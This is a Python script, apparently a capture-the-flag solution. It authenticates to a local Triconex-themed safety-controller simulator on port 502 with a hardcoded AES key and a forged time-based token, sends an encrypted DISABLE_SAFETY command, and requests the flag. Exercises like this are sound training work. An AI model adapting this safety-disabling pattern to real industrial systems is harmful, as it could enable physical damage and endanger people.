import socket
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib

# Clave AES-256 (32 bytes)
MAINTENANCE_KEY = b"TRICONEX-MAINT-SCH-34-Sx0!pqB.rT"

def generate_dynamic_token():
    """Genera un token de autenticación dinámico"""
    time_factor = int(time.time() / 300)
    system_salt = 0xCAFE 
    return hashlib.sha256(f"{time_factor}{system_salt}".encode()).hexdigest()[:8]

def encrypt_response(token, timestamp):
    """Cifra la respuesta del cliente"""
    cipher = AES.new(MAINTENANCE_KEY, AES.MODE_ECB)
    response = f"{token}|{timestamp}".encode()
    return cipher.encrypt(pad(response, AES.block_size))

def send_command(client_id):
    """Conecta al servidor y solicita la flag directamente"""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect(('localhost', 502))  # Cambia 'localhost' si es necesario

            # Paso 1: Autenticación
            token = generate_dynamic_token()
            timestamp = str(time.time())
            encrypted_response = encrypt_response(token, timestamp)
            s.sendall(encrypted_response)

            # Recibir la clave de sesión
            session_key = s.recv(1024)
            if not session_key:
                print("Autenticación fallida.")
                return

            # Crear el cifrador con la clave de sesión
            cipher = AES.new(session_key, AES.MODE_ECB)

            # Paso 2: Deshabilitar la seguridad
            disable_safety_command = "DISABLE_SAFETY"
            encrypted_disable_safety_command = cipher.encrypt(pad(disable_safety_command.encode(), AES.block_size))
            s.sendall(encrypted_disable_safety_command)

            # Recibir respuesta sobre la redundancia
            disable_safety_response = s.recv(1024)

            # Paso 3: Solicitar la flag directamente
            get_flag_command = "GET_FLAG"
            encrypted_get_flag_command = cipher.encrypt(pad(get_flag_command.encode(), AES.block_size))
            s.sendall(encrypted_get_flag_command)

            # Leer la respuesta del servidor
            flag_response = s.recv(1024)
            if flag_response:
                print("Flag recibida del servidor:", flag_response.decode())
            else:
                print("Error: No se recibió respuesta al comando GET_FLAG.")
        except Exception as e:
            print(f"Error durante la comunicación con el servidor: {e}")
        finally:
            print("Comando procesado correctamente.")

if __name__ == "__main__":
    client_id = "client_1"  # Identificador único para el cliente
    send_command(client_id)